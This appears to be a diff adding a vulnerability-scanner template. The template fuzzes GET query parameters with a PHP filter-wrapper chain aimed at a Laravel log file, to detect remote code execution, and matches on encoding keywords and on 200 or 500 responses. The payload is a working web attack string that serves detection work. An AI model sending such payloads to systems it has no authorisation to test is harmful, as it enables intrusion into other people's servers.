@@ -1,0 +1,42 @@
+id: fuzz-rce-php-filter
+
+info:
+  name: Remote Code Execution via PHP Filter
+  author: netbaan
+  severity: high
+  description: |
+    This template detects potential RCE vulnerabilities using PHP filter wrappers to access sensitive files.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      rce:
+        - "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "base64"
+          - "quoted-printable"
+          - "utf-16le"
+          - "error"    # Optional, can be adjusted based on the application's error messages
+
+      - type: status
+        status:
+          - 200     # Check for successful response
+          - 500     # Check for internal server error, indicating potential vulnerability
